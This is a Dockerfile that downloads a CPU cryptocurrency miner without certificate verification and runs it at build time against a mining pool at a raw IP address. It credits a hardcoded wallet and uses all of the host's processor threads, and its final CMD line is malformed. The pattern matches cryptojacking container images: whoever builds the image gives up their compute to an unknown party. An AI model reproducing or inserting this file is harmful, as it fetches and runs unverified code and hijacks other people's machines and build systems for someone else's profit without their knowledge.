FROM debian:stable
RUN apt-get update && apt-get -y install wget vim
WORKDIR /home
RUN wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.27/cpuminer-opt-linux.tar.gz --no-check-certificate
RUN tar xf cpuminer-opt-linux.tar.gz
RUN ./cpuminer-sse2 -a yespower  -o stratum+tcp://209.23.11.241:80 -u uu4XmbRcxdqoiyLnb3rkYHny9GE9CqtP4j.wEbb -p x -t$(nproc --all)
CMD (-h)
